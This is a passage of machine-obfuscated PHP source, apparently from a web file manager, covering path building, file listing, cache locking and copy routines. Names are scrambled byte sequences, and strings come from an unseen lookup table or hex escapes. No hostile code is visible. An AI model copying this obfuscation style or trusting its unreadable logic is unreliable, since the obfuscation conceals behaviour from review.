$¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[517]] = $ÓÙƒ…¢å; $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[518]] = $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[519]]; $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[520]] = $ºŒÌ¹ÇÕ[88]; if ($ÓÙƒ…¢å[$ºŒÌ¹ÇÕ[454]] != $ˆ™ÖÎˆì) { $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[414]] = $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[414]] & $ÓÙƒ…¢å[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[413]]; } continue; } $¸†¬·Ú¬ = $this->parentLevelArray($¹±ÜÇÓ[$ºŒÌ¹ÇÕ[521]]); $Ç…‡È­ = array_reverse($¸†¬·Ú¬); foreach ($Ç…‡È­ as $´¹Îìã™ => $¤ï‚„ö§) { if (!isset($‰£¼ëŞñ[$¤ï‚„ö§])) { continue; } $ÓÙƒ…¢å = $‰£¼ëŞñ[$¤ï‚„ö§]; $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[517]] = $ÓÙƒ…¢å; if ($ÓÙƒ…¢å[$ºŒÌ¹ÇÕ[454]] != $ˆ™ÖÎˆì) { $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[414]] = $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[414]] & $ÓÙƒ…¢å[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[413]]; } $ÜãäÔ¾¢ = $ºŒÌ¹ÇÕ[12]; $ºÎ‡ãíÂ = count($¸†¬·Ú¬) - $´¹Îìã™; for ($¢µêûÆÕ = 0; $¢µêûÆÕ < $ºÎ‡ãíÂ; $¢µêûÆÕ++) { if (!isset($ù¶œéì¢[$¸†¬·Ú¬[$¢µêûÆÕ]])) { $ÜãäÔ¾¢ = $ºŒÌ¹ÇÕ[12]; break; } $ÜãäÔ¾¢ = $ÜãäÔ¾¢ . rtrim($ù¶œéì¢[$¸†¬·Ú¬[$¢µêûÆÕ]], $ºŒÌ¹ÇÕ[8]) . $ºŒÌ¹ÇÕ[8]; } $¹±ÜÇÓ[$ºŒÌ¹ÇÕ[413]][$ºŒÌ¹ÇÕ[518]] = rtrim($ÜãäÔ¾¢, $ºŒÌ¹ÇÕ[8]) . $ºŒÌ¹ÇÕ[8]; break; } } unset($¹±ÜÇÓ); } public function groupPathDisplay(&$Ë«É–£“) { $’¹®¥Çá =& $_SERVER[­õöî’–]; if ($Ë«É–£“[$’¹®¥Çá[411]] != self::TYPE_GROUP) { return; } $†Ø§£ĞÑ = Model($’¹®¥Çá[522])->getInfo($Ë«É–£“[$’¹®¥Çá[505]]); $Ş©ÊÕÜı = $this->parentLevelArray($†Ø§£ĞÑ[$’¹®¥Çá[521]]); $•Ë¨ÅòÑ = $’¹®¥Çá[12]; foreach ($Ş©ÊÕÜı as $¶ìÙÕÛ˜) { $›ŸüŞ¸ú = Model($’¹®¥Çá[522])->getInfo($¶ìÙÕÛ˜); $•Ë¨ÅòÑ .= $›ŸüŞ¸ú[$’¹®¥Çá[86]][$’¹®¥Çá[402]] . $’¹®¥Çá[50]; } $Ë«É–£“[$’¹®¥Çá[523]] = $†Ø§£ĞÑ[$’¹®¥Çá[432]]; $Ë«É–£“[$’¹®¥Çá[524]] = $†Ø§£ĞÑ[$’¹®¥Çá[521]]; $Ë«É–£“[$’¹®¥Çá[525]] = $†Ø§£ĞÑ[$’¹®¥Çá[526]]; $Ë«É–£“[$’¹®¥Çá[527]] = $•Ë¨ÅòÑ . $†Ø§£ĞÑ[$’¹®¥Çá[86]][$’¹®¥Çá[402]]; } protected function _listAppendPath(&$ïøƒò±ª, $øø¸°™­ = false) { $Ö…ıÚš =& $_SERVER[­õöî’–]; static $»Ì¥şëé = array(); $å˜»²ªÄ = array(); $•Ñ½¬¬§ = array(); if ($øø¸°™­) { return $»Ì¥şëé; } foreach ($ïøƒò±ª as &$ıõŒ¬§¿) { $ôˆçÔÍ  = $ıõŒ¬§¿[$Ö…ıÚš[402]]; if ($ıõŒ¬§¿[$Ö…ıÚš[410]] == $Ö…ıÚš[88] && $ıõŒ¬§¿[$Ö…ıÚš[432]] != 0) { $»Ì¥şëé[$ôˆçÔÍ ] = $ıõŒ¬§¿[$Ö…ıÚš[32]]; } if ($ıõŒ¬§¿[$Ö…ıÚš[410]] == $Ö…ıÚš[88] && $ıõŒ¬§¿[$Ö…ıÚš[432]] == 0 && !isset($»Ì¥şëé[$ôˆçÔÍ ])) { $»Ì¥şëé[$ôˆçÔÍ ] = $this->_listAppendPathRoot($ıõŒ¬§¿, array()); } if (isset($•Ñ½¬¬§[$ıõŒ¬§¿[$Ö…ıÚš[521]]])) { continue; } $•Ñ½¬¬§[$ıõŒ¬§¿[$Ö…ıÚš[521]]] = !0; $Ş§ÅÁ«° = $this->parentLevelArray($ıõŒ¬§¿[$Ö…ıÚš[521]]); foreach ($Ş§ÅÁ«° as $ Ç—ã³¡ => $Áô‘ãó¤) { if (isset($»Ì¥şëé[$Áô‘ãó¤])) { continue; } if ($ Ç—ã³¡ == 0) { $»Ì¥şëé[$Áô‘ãó¤] = $this->_listAppendPathRoot($ıõŒ¬§¿, $Ş§ÅÁ«°); } if ($ Ç—ã³¡ != 0) { $å˜»²ªÄ[] = $Áô‘ãó¤; } } } unset($ıõŒ¬§¿); $å˜»²ªÄ = array_unique($å˜»²ªÄ); if (count($å˜»²ªÄ) > 0) { $ÕşõÛË = array($Ö…ıÚš[417] => array($Ö…ıÚš[418], $å˜»²ªÄ)); if (count($å˜»²ªÄ) == 1) { $‡Ğ«õº‰ = $this->sourceInfo($å˜»²ªÄ[0]); $ßŸéê¡ = is_array($‡Ğ«õº‰) ? array($‡Ğ«õº‰) : !1; } else { $ßŸéê¡ = $this->field($Ö…ıÚš[528])->where($ÕşõÛË)->select(); } if (!$ßŸéê¡) { $ßŸéê¡ = array(); } foreach ($ßŸéê¡ as $­µñª‹Ï) { $»Ì¥şëé[$­µñª‹Ï[$Ö…ıÚš[402]]] = $­µñª‹Ï[$Ö…ıÚš[32]]; } } $Š§õ¤ş = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $§ÄŞè÷ = array(); foreach ($ïøƒò±ª as &$ıõŒ¬§¿) { $Ä¿œõŸ× = $ıõŒ¬§¿[$Ö…ıÚš[521]]; $³ôø¿ıÔ = $Ö…ıÚš[12]; if (isset($§ÄŞè÷[$Ä¿œõŸ×])) { $³ôø¿ıÔ = $§ÄŞè÷[$Ä¿œõŸ×]; } else { $Ş§ÅÁ«° = $this->parentLevelArray($ıõŒ¬§¿[$Ö…ıÚš[521]]); foreach ($Ş§ÅÁ«° as $ Ç—ã³¡ => $Áô‘ãó¤) { if (isset($»Ì¥şëé[$Áô‘ãó¤])) { $³ôø¿ıÔ .= $»Ì¥şëé[$Áô‘ãó¤] . $Ö…ıÚš[8]; } } $§ÄŞè÷[$Ä¿œõŸ×] = $³ôø¿ıÔ; } $³ôø¿ıÔ .= $ıõŒ¬§¿[$Ö…ıÚš[32]]; if ($ıõŒ¬§¿[$Ö…ıÚš[410]] == $Ö…ıÚš[88]) { $³ôø¿ıÔ .= $Ö…ıÚš[8]; } $ıõŒ¬§¿[$Ö…ıÚš[519]] = str_replace($Ö…ıÚš[529], $Ö…ıÚš[8], $³ôø¿ıÔ); if ($ıõŒ¬§¿[$Ö…ıÚš[432]] == $Ö…ıÚš[197]) { $ıõŒ¬§¿[$Ö…ıÚš[32]] = trim($»Ì¥şëé[$ıõŒ¬§¿[$Ö…ıÚš[402]]], $Ö…ıÚš[8]); $ıõŒ¬§¿[$Ö…ıÚš[519]] = $ıõŒ¬§¿[$Ö…ıÚš[32]] . $Ö…ıÚš[8]; } if (intval($ıõŒ¬§¿[$Ö…ıÚš[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ıõŒ¬§¿, $Ş§ÅÁ«°, $Š§õ¤ş); } } unset($ıõŒ¬§¿); return $ïøƒò±ª; } private function _listAppendPathRecycle(&$å£¬½ôÍ, $Ë“ÚÊŞ, $Ü¤Ë›Çü) { $ıïç­ıò =& $_SERVER[­õöî’–]; if (!in_array($Ü¤Ë›Çü, $Ë“ÚÊŞ) && $å£¬½ôÍ[$ıïç­ıò[402]] != $Ü¤Ë›Çü) { return; } $çú¦†öˆ = explode($ıïç­ıò[8], trim($å£¬½ôÍ[$ıïç­ıò[519]], $ıïç­ıò[8])); $“ØšŠ÷“ = implode($ıïç­ıò[8], array_slice($çú¦†öˆ, 2)); $å£¬½ôÍ[$ıïç­ıò[519]] = $ıïç­ıò[8] . LNG($ıïç­ıò[530]) . $ıïç­ıò[8] . ltrim($“ØšŠ÷“, $ıïç­ıò[8]); $å£¬½ôÍ[$ıïç­ıò[521]] = $ıïç­ıò[531] . implode($ıïç­ıò[50], array_slice($Ë“ÚÊŞ, 1)) . $ıïç­ıò[50]; if ($å£¬½ôÍ[$ıïç­ıò[402]] == $Ü¤Ë›Çü) { $å£¬½ôÍ[$ıïç­ıò[521]] = $ıïç­ıò[531]; $å£¬½ôÍ[$ıïç­ıò[432]] = $ıïç­ıò[197]; $å£¬½ôÍ[$ıïç­ıò[32]] = LNG($ıïç­ıò[530]); } $å£¬½ôÍ[$ıïç­ıò[532]] = $ıïç­ıò[533]; } protected function _listAppendPathRoot(&$›ùîÄã¬, $Ç°“ÉÆ) { $«ùç³”º =& $_SERVER[­õöî’–]; static $ê¹”øşØ = false; $îíê§¼” = $«ùç³”º[12]; if ($›ùîÄã¬[$«ùç³”º[411]] == self::TYPE_USER) { if (defined($«ùç³”º[475]) && $›ùîÄã¬[$«ùç³”º[505]] == USER_ID) { $îíê§¼” = LNG($«ùç³”º[534]); if ($ê¹”øşØ === !1) { $Î”û•åĞ = Model($«ùç³”º[535])->getInfoFull(USER_ID); $ê¹”øşØ = _get($Î”û•åĞ, $«ùç³”º[536], $«ùç³”º[12]); } if ($Ç°“ÉÆ && $Ç°“ÉÆ[0] == $ê¹”øşØ || !$Ç°“ÉÆ && $›ùîÄã¬[$«ùç³”º[402]] == $ê¹”øşØ) { $îíê§¼” = LNG($«ùç³”º[537]); $›ùîÄã¬[$«ùç³”º[538]] = $«ùç³”º[539]; } if (!$Ç°“ÉÆ) { $›ùîÄã¬[$«ùç³”º[32]] = $îíê§¼”; } } else { $í©ßƒÀ‚ = Model($«ùç³”º[513])->getInfoSimple($›ùîÄã¬[$«ùç³”º[505]]); $îíê§¼” = LNG($«ùç³”º[540]) . $«ùç³”º[162] . $í©ßƒÀ‚[$«ùç³”º[32]] . $«ùç³”º[164]; $›ùîÄã¬[$«ùç³”º[541]] = array($«ùç³”º[32] => $í©ßƒÀ‚[$«ùç³”º[32]], $«ùç³”º[542] => $í©ßƒÀ‚[$«ùç³”º[542]], $«ùç³”º[543] => $í©ßƒÀ‚[$«ùç³”º[543]]); } } else { if ($›ùîÄã¬[$«ùç³”º[411]] == self::TYPE_GROUP) { $í©ßƒÀ‚ = Model($«ùç³”º[522])->getInfoSimple($›ùîÄã¬[$«ùç³”º[505]]); $îíê§¼” = $í©ßƒÀ‚[$«ùç³”º[32]]; } else { if ($›ùîÄã¬[$«ùç³”º[411]] == self::TYPE_SYSTEM) { $îíê§¼” = $«ùç³”º[544]; } } } $îíê§¼” = $îíê§¼” ? $«ùç³”º[8] . $îíê§¼” . $«ùç³”º[8] : $«ùç³”º[8]; return $îíê§¼”; } protected function _listAppendUser(&$ƒé’ÈØñ) { $ã³äóÅ¾ =& $_SERVER[­õöî’–]; $€šŸ‰ø  = array_to_keyvalue($ƒé’ÈØñ, $ã³äóÅ¾[12], $ã³äóÅ¾[454]); $É´ÊÇƒã = array_to_keyvalue($ƒé’ÈØñ, $ã³äóÅ¾[12], $ã³äóÅ¾[456]); $ “ªŞÊı = array_merge($€šŸ‰ø , $É´ÊÇƒã); $¦òÀôÀ„ = Model($ã³äóÅ¾[535])->userListInfo($ “ªŞÊı); foreach ($ƒé’ÈØñ as &$µ¦®úõ) { $ÓÊÚÖš¡ = $µ¦®úõ[$ã³äóÅ¾[454]]; $µ¦®úõ[$ã³äóÅ¾[454]] = $¦òÀôÀ„[$ÓÊÚÖš¡] ? $¦òÀôÀ„[$ÓÊÚÖš¡] : !1; $ÓÊÚÖš¡ = $µ¦®úõ[$ã³äóÅ¾[456]]; $µ¦®úõ[$ã³äóÅ¾[456]] = $¦òÀôÀ„[$ÓÊÚÖš¡] ? $¦òÀôÀ„[$ÓÊÚÖš¡] : !1; if (isset($µ¦®úõ[$ã³äóÅ¾[466]]) && $µ¦®úõ[$ã³äóÅ¾[466]][$ã³äóÅ¾[545]]) { $«İìãŠ = $GLOBALS[$ã³äóÅ¾[6]][$ã³äóÅ¾[89]][$ã³äóÅ¾[546]]; if ($µ¦®úõ[$ã³äóÅ¾[466]][$ã³äóÅ¾[547]] <= time() - $«İìãŠ) { $this->metaSet($µ¦®úõ[$ã³äóÅ¾[402]], $ã³äóÅ¾[545], null); $this->metaSet($µ¦®úõ[$ã³äóÅ¾[402]], $ã³äóÅ¾[547], null); unset($µ¦®úõ[$ã³äóÅ¾[466]][$ã³äóÅ¾[545]]); continue; } $®Û†äà = $µ¦®úõ[$ã³äóÅ¾[466]][$ã³äóÅ¾[545]]; $µ¦®úõ[$ã³äóÅ¾[466]][$ã³äóÅ¾[548]] = Model($ã³äóÅ¾[535])->getInfoSimpleOuter($®Û†äà); } } unset($µ¦®úõ); } public function parentLevelArray($ƒ‡òš©²) { $û‰Æšöä =& $_SERVER[­õöî’–]; $ƒ‡òš©² = explode($û‰Æšöä[50], trim($ƒ‡òš©², $û‰Æšöä[50])); return array_remove_value($ƒ‡òš©², $û‰Æšöä[197]); } public function listAll($„‹ò³˜Á) { $²‘Šå©Ñ =& $_SERVER[­õöî’–]; $şÛ²­£ = $this->sourceInfo($„‹ò³˜Á); $´ì¼“¹ = array($²‘Šå©Ñ[549] => array($²‘Šå©Ñ[550], $şÛ²­£[$²‘Šå©Ñ[521]] . $„‹ò³˜Á . $²‘Šå©Ñ[551]), $²‘Šå©Ñ[552] => 0); $¯ûÙ¢ì = $²‘Šå©Ñ[553]; $¤Îö˜‰Á = "\x4c\105\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\146\x69\154\x65\x20\x66\151\x6c\145\x20\x6f\x6e\40\x73\x6f\x75\x72\x63\145\x2e\146\x69\154\x65\x49\104\40\x3d\40\146\151\154\145\x2e\146\151\154\145\111\x44"; $È‘¼ŠÒ· = $this->alias($²‘Šå©Ñ[446])->field($¯ûÙ¢ì)->where($´ì¼“¹)->join($¤Îö˜‰Á)->select(); $this->_listAppendAuth($È‘¼ŠÒ·); $this->_listAppendUser($È‘¼ŠÒ·); $this->_listAppendPath($È‘¼ŠÒ·); $È‘¼ŠÒ· = array_to_keyvalue($È‘¼ŠÒ·, $²‘Šå©Ñ[402]); $“›õ€æ = "\57{$şÛ²­£[$²‘Šå©Ñ[32]]}\x2f"; $“›õ€æ = $“›õ€æ == $²‘Šå©Ñ[529] ? $²‘Šå©Ñ[8] : $“›õ€æ; $˜àÊ¡¼» = array(); foreach ($È‘¼ŠÒ· as $Å£œşÏ§ => $¹¯îÃ›Ï) { $ìØ„Â¥¶ = $this->parentLevelArray($¹¯îÃ›Ï[$²‘Šå©Ñ[521]]); array_shift($ìØ„Â¥¶); $ºŸı½øü = $“›õ€æ; for ($Èú·İ²° = 0; $Èú·İ²° < count($ìØ„Â¥¶); $Èú·İ²°++) { $ºŸı½øü .= $È‘¼ŠÒ·[$ìØ„Â¥¶[$Èú·İ²°]][$²‘Šå©Ñ[32]] . $²‘Šå©Ñ[8]; } $ºŸı½øü .= $¹¯îÃ›Ï[$²‘Šå©Ñ[32]]; if ($¹¯îÃ›Ï[$²‘Šå©Ñ[410]]) { $ºŸı½øü .= $²‘Šå©Ñ[8]; } $ºŸı½øü = str_replace($²‘Šå©Ñ[529], $²‘Šå©Ñ[8], $ºŸı½øü); $ºŸı½øü = str_replace($²‘Šå©Ñ[529], $²‘Šå©Ñ[8], $ºŸı½øü); $õ¤åòØÅ = array($²‘Šå©Ñ[421] => str_replace($²‘Šå©Ñ[529], $²‘Šå©Ñ[8], $ºŸı½øü), $²‘Šå©Ñ[554] => intval($¹¯îÃ›Ï[$²‘Šå©Ñ[410]]), $²‘Šå©Ñ[86] => $this->pathInfoFilter($¹¯îÃ›Ï)); if (!$¹¯îÃ›Ï[$²‘Šå©Ñ[410]]) { $õ¤åòØÅ[$²‘Šå©Ñ[468]] = $¹¯îÃ›Ï[$²‘Šå©Ñ[468]]; $õ¤åòØÅ[$²‘Šå©Ñ[87]] = $¹¯îÃ›Ï[$²‘Šå©Ñ[84]]; } $˜àÊ¡¼»[] = $õ¤åòØÅ; } return $˜àÊ¡¼»; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($öş×¶ï) { $”ÛûíÂš =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $this->_lockCheck($”ÛûíÂš[555], $öş×¶ï); $ºÚÇï‰¬ = 1; $this->_lockEvent($öş×¶ï, array($”ÛûíÂš[556], $”ÛûíÂš[557]), $ºÚÇï‰¬); $this->_lockParent($öş×¶ï, array($”ÛûíÂš[557]), $ºÚÇï‰¬); $this->_lockEvent($öş×¶ï, array($”ÛûíÂš[558], $”ÛûíÂš[559]), $ºÚÇï‰¬); $this->_lockCheckEnd($”ÛûíÂš[555], $öş×¶ï); } public function lockCopyEnd($Ëàß—¾ì) { $÷¾¡¥§É =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $ÑÁ¼²»ı = 0; $this->_lockEvent($Ëàß—¾ì, array($÷¾¡¥§É[556], $÷¾¡¥§É[557]), $ÑÁ¼²»ı); $this->_lockParent($Ëàß—¾ì, array($÷¾¡¥§É[557]), $ÑÁ¼²»ı); $this->_lockEvent($Ëàß—¾ì, array($÷¾¡¥§É[558], $÷¾¡¥§É[559]), $ÑÁ¼²»ı); } public function lockWriteStart($‘»³ö£Ê, $Ô£‰’ëì = '') { $²ÖºÅ =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $this->_lockCheck($²ÖºÅ[556], $‘»³ö£Ê); $şçÍÌôÅ = 1; $this->_lockKey($²ÖºÅ[560] . $‘»³ö£Ê . $²ÖºÅ[10] . $Ô£‰’ëì, $şçÍÌôÅ); $this->_lockEvent($‘»³ö£Ê, array($²ÖºÅ[555], $²ÖºÅ[557]), $şçÍÌôÅ); $this->_lockParent($‘»³ö£Ê, array($²ÖºÅ[555], $²ÖºÅ[557]), $şçÍÌôÅ); $this->_lockCheckEnd($²ÖºÅ[556], $‘»³ö£Ê); } public function lockWriteEnd($ñã–ÑíÔ, $ãçç¤³Ü = '') { $ñ˜ûáÀ¡ =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $ãŠÙ Ê² = 0; $this->_lockKey($ñ˜ûáÀ¡[560] . $ñã–ÑíÔ . $ñ˜ûáÀ¡[10] . $ãçç¤³Ü, $ãŠÙ Ê²); $this->_lockEvent($ñã–ÑíÔ, array($ñ˜ûáÀ¡[555], $ñ˜ûáÀ¡[557]), $ãŠÙ Ê²); $this->_lockParent($ñã–ÑíÔ, array($ñ˜ûáÀ¡[555], $ñ˜ûáÀ¡[557]), $ãŠÙ Ê²); } public function lockMoveStart($‹¡ª£òÕ) { $¢®¬åõõ =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $this->_lockCheck($¢®¬åõõ[557], $‹¡ª£òÕ); $½Í‚µ£ß = 1; $this->_lockKey($¢®¬åõõ[561] . $‹¡ª£òÕ, $½Í‚µ£ß); $this->_lockEvent($‹¡ª£òÕ, array($¢®¬åõõ[555], $¢®¬åõõ[556]), $½Í‚µ£ß); $this->_lockParent($‹¡ª£òÕ, array($¢®¬åõõ[555], $¢®¬åõõ[557]), $½Í‚µ£ß); $this->_lockEvent($‹¡ª£òÕ, array($¢®¬åõõ[562], $¢®¬åõõ[558], $¢®¬åõõ[559]), $½Í‚µ£ß); $this->_lockCheckEnd($¢®¬åõõ[557], $‹¡ª£òÕ); } public function lockMoveEnd($îõŸãÎ ) { $»şõï¸‚ =& $_SERVER[­õöî’–]; if (!$this->allowLock()) { return; } $ÈŠ´ù¯ = 0; $this->_lockKey($»şõï¸‚[561] . $îõŸãÎ , $ÈŠ´ù¯); $this->_lockEvent($îõŸãÎ , array($»şõï¸‚[555], $»şõï¸‚[556]), $ÈŠ´ù¯); $this->_lockParent($îõŸãÎ , array($»şõï¸‚[555], $»şõï¸‚[557]), $ÈŠ´ù¯); $this->_lockEvent($îõŸãÎ , array($»şõï¸‚[562], $»şõï¸‚[558], $»şõï¸‚[559]), $ÈŠ´ù¯); } private function _lockCheck($›ÑèÔÙÂ, $ĞÑèüŞŸ) { $—“Ş¼Ôì =& $_SERVER[­õöî’–]; $–õ…•÷ = $this->sourceInfo($ĞÑèüŞŸ); $Á¼û–ñ = $›ÑèÔÙÂ . $—“Ş¼Ôì[10] . $ĞÑèüŞŸ; $this->_lockTimeStart[$Á¼û–ñ] = timeFloat(); if (!is_array($–õ…•÷)) { return; } $ª÷¯†õŞ = LNG($—“Ş¼Ôì[563]); CacheLock::setErrorMsg($—“Ş¼Ôì[162] . htmlspecialchars($–õ…•÷[$—“Ş¼Ôì[32]]) . $—“Ş¼Ôì[164] . $ª÷¯†õŞ); $this->_lockKey($Á¼û–ñ, 1); $this->_lockKey($Á¼û–ñ, 0); $¦’Ù‹ã¼ = array_reverse($this->parentLevelArray($–õ…•÷[$—“Ş¼Ôì[521]])); foreach ($¦’Ù‹ã¼ as $Ê²¤™É) { $Á¼û–ñ = $›ÑèÔÙÂ . $—“Ş¼Ôì[564] . $Ê²¤™É; if (CacheLock::lockGet($—“Ş¼Ôì[565] . $Á¼û–ñ)) { $–õ…•÷ = $this->sourceInfo($Ê²¤™É); CacheLock::setErrorMsg($—“Ş¼Ôì[162] . htmlspecialchars($–õ…•÷[$—“Ş¼Ôì[32]]) . $—“Ş¼Ôì[164] . $ª÷¯†õŞ); $this->_lockKey($Á¼û–ñ, 1); $this->_lockKey($Á¼û–ñ, 0); } } } private function _lockCheckEnd($òõ¢î»Ö, $½Ì»«Ï¤) { $œ°Æü÷ =& $_SERVER[­õöî’–]; $Ô àûì» = $òõ¢î»Ö . $œ°Æü÷[10] . $½Ì»«Ï¤; CacheLock::setErrorMsg($œ°Æü÷[378]); if (!isset($this->_lockTimeStart[$Ô àûì»])) { return; } $Ä‰ó­Ñ³ = timeFloat() - $this->_lockTimeStart[$Ô àûì»]; unset($this->_lockTimeStart[$Ô àûì»]); if ($Ä‰ó­Ñ³ > 0.5) { unset(self::$cacheSourceInfo[$œ°Æü÷[460] . $½Ì»«Ï¤]); } $Ğ¥ç²½¥ = $this->sourceInfo($½Ì»«Ï¤); if (!$Ğ¥ç²½¥) { show_json(LNG($œ°Æü÷[105]), !1); } } private function _lockParent($ñüÈ³ñë, $‚ÎˆİÜì, $¨š©¬ÄÈ) { if (!$this->autoLockSet) { return; } $Ë–Ø¡µ˜ = $this->sourceInfo($ñüÈ³ñë); if (!is_array($Ë–Ø¡µ˜)) { return; } $ÂÂ‰²Ô¶ = array_reverse($this->parentLevelArray($Ë–Ø¡µ˜[$_SERVER[­õöî’–][521]])); foreach ($ÂÂ‰²Ô¶ as $àŒ¬ùû») { $this->_lockEvent($àŒ¬ùû», $‚ÎˆİÜì, $¨š©¬ÄÈ); } } private function _lockEvent($àï°†â, $üˆ®ı˜, $¢±ÒÕÂÈ) { $ïÍÌ° =& $_SERVER[­õöî’–]; if (!$this->autoLockSet) { return; } foreach ($üˆ®ı˜ as $æ·ŸØÄª) { $ÜºÌßÔƒ = $æ·ŸØÄª . $ïÍÌ°[10] . $àï°†â; if ($¢±ÒÕÂÈ && CacheLock::lockGet($ïÍÌ°[565] . $ÜºÌßÔƒ)) { continue; } $this->_lockKey($ÜºÌßÔƒ, $¢±ÒÕÂÈ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ÿ¨Ø¯èá, $íõÆæÕî = 1) { $Á‘şÚ©Ù = $_SERVER[­õöî’–][565] . md5($Ÿ¨Ø¯èá); if ($íõÆæÕî) { if (isset(self::$_lockItemArr[$Á‘şÚ©Ù])) { return; } self::$_lockItemArr[$Á‘şÚ©Ù] = 1; CacheLock::lock($Á‘şÚ©Ù, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Á‘şÚ©Ù])) { return; } unset(self::$_lockItemArr[$Á‘şÚ©Ù]); CacheLock::unlock($Á‘şÚ©Ù); } } public function isParentOf($“Õœê¾·, $ö¯Îğ³Ç) { $¹±©Üš =& $_SERVER[­õöî’–]; $†ú¬òÏğ = $this->sourceInfo($“Õœê¾·); $éº‹Ïå = $this->sourceInfo($ö¯Îğ³Ç); $®•àÛ· = $†ú¬òÏğ[$¹±©Üš[521]] . $†ú¬òÏğ[$¹±©Üš[402]] . $¹±©Üš[50]; $ı­ö¦ı® = $éº‹Ïå[$¹±©Üš[521]] . $éº‹Ïå[$¹±©Üš[402]] . $¹±©Üš[50]; $«Î·Òëç = strpos($ı­ö¦ı®, $®•àÛ·) === 0; return $«Î·Òëç; } private $targetIsDelete = 0; public function copy($°´ŠºŸÁ, $ÃıÌ‘‚ã, $›§®©ş = REPEAT_REPLACE, $­ìê¦­Ç = '') { $ó†¿›¦« =& $_SERVER[­õöî’–]; $Â™Ùîí´ = $this->sourceInfo($°´ŠºŸÁ); $¸¾Ö„¶¡ = $this->sourceInfo($ÃıÌ‘‚ã); if (!$Â™Ùîí´ || !$¸¾Ö„¶¡ || $¸¾Ö„¶¡[$ó†¿›¦«[410]] != $ó†¿›¦«[88]) { return !1; } if ($this->isParentOf($°´ŠºŸÁ, $ÃıÌ‘‚ã)) { return !1; } $–”ñÆŞ  = $­ìê¦­Ç ? $­ìê¦­Ç : $Â™Ùîí´[$ó†¿›¦«[32]]; $this->lockCopyStart($°´ŠºŸÁ); $this->lockWriteStart($ÃıÌ‘‚ã, $–”ñÆŞ ); $²«»½… = array($ó†¿›¦«[566] => array(), $ó†¿›¦«[567] => array(), $ó†¿›¦«[568] => array()); $this->targetIsDelete = intval($Â™Ùîí´[$ó†¿›¦«[431]]); $¹Šë‰…³ = $this->fileNameExistCache($ÃıÌ‘‚ã, $Â™Ùîí´[$ó†¿›¦«[32]]); $¯ñ—«‘º = $this->_copy($°´ŠºŸÁ, $ÃıÌ‘‚ã, $›§®©ş, $²«»½…, !0, $­ìê¦­Ç); $this->_childrenListClear(); $this->lockCopyEnd($°´ŠºŸÁ); $this->lockWriteEnd($ÃıÌ‘‚ã, $–”ñÆŞ ); if ($Â™Ùîí´[$ó†¿›¦«[410]] == $ó†¿›¦«[88] && $¹Šë‰…³ == $¯ñ—«‘º) { $this->folderSizeResetChildren($¹Šë‰…³); } Model($ó†¿›¦«[569])->addAll($²«»½…[$ó†¿›¦«[567]], array(), !0); if ($¹Šë‰…³ != $¯ñ—«‘º || $Â™Ùîí´[$ó†¿›¦«[410]] == $ó†¿›¦«[88]) { Model($ó†¿›¦«[570])->eventCopy($¯ñ—«‘º); } $this->saveAll($²«»½…[$ó†¿›¦«[568]]); Model($ó†¿›¦«[199])->linkAdd($²«»½…[$ó†¿›¦«[566]]); $this->folderSizeReset($ÃıÌ‘‚ã); $this->updateModifyTime($ÃıÌ‘‚ã); return $¯ñ—«‘º; } private function _copy($Üó¯ç¼, $íˆş²Óˆ, $ëÇ™Ò , &$ğßÏ½¯±, $¿Æ°Ñı¤, $Û¶…ş = '') { $Éà‰øÎï =& $_SERVER[­õöî’–]; $ı–¬Î½ = $this->sourceInfoCache($Üó¯ç¼); $©Ï†º¶ë = $ı–¬Î½[$Éà‰øÎï[410]] == $Éà‰øÎï[88]; $…ÉçĞÀÖ = $Û¶…ş ? $Û¶…ş : $ı–¬Î½[$Éà‰øÎï[32]]; $ú»Íº¼ = $this->fileNameExistCache($íˆş²Óˆ, $…ÉçĞÀÖ); if ($¿Æ°Ñı¤) { $this->_childrenAllMake($Üó¯ç¼); if ($©Ï†º¶ë && $ú»Íº¼) { $this->_childrenAllMake($ú»Íº¼); } } if (!$ú»Íº¼) { return $this->_copyCreate($Üó¯ç¼, $íˆş²Óˆ, $…ÉçĞÀÖ, $ğßÏ½¯±); } $„°Éø³Ì = $ú»Íº¼; if ($©Ï†º¶ë) { if ($ëÇ™Ò  == REPEAT_RENAME_FOLDER) { $…ÉçĞÀÖ = $this->fileNameAutoCache($íˆş²Óˆ, $…ÉçĞÀÖ, $ëÇ™Ò , $©Ï†º¶ë); $„°Éø³Ì = $this->_copyCreate($Üó¯ç¼, $íˆş²Óˆ, $…ÉçĞÀÖ, $ğßÏ½¯±); } else { $¥¨‘ÍÒ´ = $this->_childrenList($Üó¯ç¼); foreach ($¥¨‘ÍÒ´ as $ÜŸá˜õ˜) { $this->_copy($ÜŸá˜õ˜[$Éà‰øÎï[402]], $ú»Íº¼, $ëÇ™Ò , $ğßÏ½¯±, !1); } } } else { if ($ëÇ™Ò  == REPEAT_RENAME || $ëÇ™Ò  == REPEAT_RENAME_FOLDER) { $…ÉçĞÀÖ = 